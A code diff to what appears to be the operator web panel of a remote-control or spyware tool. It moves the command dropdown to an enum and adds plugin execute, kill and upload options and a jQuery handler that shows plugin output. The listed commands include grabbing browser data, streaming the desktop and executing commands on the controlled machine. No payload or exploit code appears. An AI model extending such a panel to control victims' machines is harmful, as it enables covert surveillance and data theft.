@@ -10,18 +10,21 @@
     <div class="form-group">
         <label for="command">Command</label>
         <select id="command" class="form-control">
-            <option value="DO_NOTHING">Do nothing</option>
-            <option value="UPLOAD_IMAGE">Get image</option>
-            <option value="UPLOAD_SENTENCES">Get sentences</option>
-            <option value="UPLOAD_PORT_INFO">Get port info</option>
-            <option value="UPLOAD_BROWSER_DATA">Get browser data</option>
-            <option value="DOWNLOAD_FILE">Upload a file</option>
-            <option value="UPLOAD_FILE">Download a file</option>
-            <option value="UPLOAD_FILE_EVENTS">Get file events</option>
-            <option value="STREAM_DESKTOP">Start streaming desktop</option>
-            <option value="STOP_STREAM_DESKTOP">Stop streaming desktop</option>
-            <option value="EXECUTE_COMMAND">Execute a command</option>
-            <option value="SET_TRANSMISSION_INTERVAL">Set transmission time</option>
+            <option value="@Library.ECommand.DO_NOTHING">Do nothing</option>
+            <option value="@Library.ECommand.UPLOAD_IMAGE">Get image</option>
+            <option value="@Library.ECommand.UPLOAD_SENTENCES">Get sentences</option>
+            <option value="@Library.ECommand.UPLOAD_PORT_INFO">Get port info</option>
+            <option value="@Library.ECommand.UPLOAD_BROWSER_DATA">Get browser data</option>
+            <option value="@Library.ECommand.DOWNLOAD_FILE">Upload a file</option>
+            <option value="@Library.ECommand.UPLOAD_FILE">Download a file</option>
+            <option value="@Library.ECommand.UPLOAD_FILE_EVENTS">Get file events</option>
+            <option value="@Library.ECommand.STREAM_DESKTOP">Start streaming desktop</option>
+            <option value="@Library.ECommand.STOP_STREAM_DESKTOP">Stop streaming desktop</option>
+            <option value="@Library.ECommand.EXECUTE_COMMAND">Execute a command</option>
+            <option value="@Library.ECommand.SET_TRANSMISSION_INTERVAL">Set transmission time</option>
+            <option value="@Library.ECommand.EXECUTE_PLUGIN">Execute Plugin</option>
+            <option value="@Library.ECommand.KILL_PLUGIN">Kill Plugin</option>
+            <option value="@Library.ECommand.UPLOAD_PLUGIN">Upload Plugin</option>
         </select>
     </div>
 
@@ -79,6 +82,13 @@
             //        $('#data').html(img);
             //    });
         }, 1000);
+    }
+    function updateData() {
+        $.get('/Home/GetData')
+            .done(function (text) {
+                var txt = $('<textarea />').addClass('form-control').attr('cols', '100').attr('rows', '20').val(text);
+                $('#data').html(txt);
+            });
     }
     function updateSentences() {
         $.get('/Home/GetSentences')
@@ -200,6 +210,9 @@
                     break;
                 case 'DOWNLOAD_FILE':
                     UploadFile();
+                    break;
+                case 'EXECUTE_PLUGIN':
+                    updateData();
                     break;
             }
         }, "json");
